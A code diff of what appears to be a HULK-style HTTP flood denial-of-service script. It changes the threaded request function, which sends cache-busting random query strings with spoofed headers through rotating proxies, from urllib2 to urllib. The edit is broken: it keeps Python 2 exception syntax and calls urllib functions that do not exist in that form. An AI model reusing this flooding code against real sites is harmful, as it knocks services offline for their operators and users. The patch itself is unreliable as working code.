@@ -127,7 +127,7 @@ def httpcall(url):
 		param_joiner = "&"
 	else:
 		param_joiner = "?"
-	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
+	request = urllib.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
 	request.add_header('User-Agent', getUserAgent())
 	request.add_header('Cache-Control', 'no-cache')
 	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
@@ -137,22 +137,22 @@ def httpcall(url):
 	request.add_header('Host',host)
 
 	index = random.randint(0,len(listaproxy)-1)
-	proxy = urllib2.ProxyHandler({'http':listaproxy[index]})
-	opener = urllib2.build_opener(proxy,urllib2.HTTPHandler)
-	urllib2.install_opener(opener)	
+	proxy = urllib.ProxyHandler({'http':listaproxy[index]})
+	opener = urllib.build_opener(proxy,urllib.HTTPHandler)
+	urllib.install_opener(opener)	
 	try:
-			urllib2.urlopen(request)
+			urllib.urlopen(request)
 			if(flag==1): set_flag(0)
 			if(code==500): code=0
-	except urllib2.HTTPError, e:
+	except urllib.HTTPError, e:
 			set_flag(1)
 			code=500
 			time.sleep(60)
-	except urllib2.URLError, e:
+	except urllib.URLError, e:
 			sys.exit()
 	else:
 			inc_counter()
-			urllib2.urlopen(request)
+			urllib.urlopen(request)
 	return(code)
 
 class HTTPThread(threading.Thread):
